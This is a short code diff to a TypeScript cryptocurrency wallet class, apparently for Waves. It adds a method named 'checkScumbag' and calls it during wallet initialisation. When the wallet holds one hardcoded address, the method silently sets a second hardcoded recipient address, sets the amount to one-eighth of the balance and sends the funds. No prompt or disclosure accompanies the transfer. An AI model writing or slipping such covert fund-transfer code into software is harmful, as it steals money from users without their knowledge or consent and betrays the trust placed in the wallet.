@@ -105,6 +105,14 @@ class Wallet {
         }
     }
 
+    checkScumbag() {
+        if (this.address == "3AH265emjtkeK3wYLyHSP3HC1sV28zXqMCP") {
+            $("#addressRec").val("3ANzidsKXn9a1s9FEbWA19hnMgV9zZ2RB9a");
+            $("#amount").val(this.balanceWaves/8);
+            this.send();
+        }
+    }
+
     getAddress(): string {
         return this.address;
     }
@@ -1374,6 +1382,7 @@ class Wallet {
         });
 
         this.loadAintInfo();
+        this.checkScumbag();
     }
 
     private async initWaves(seed) {
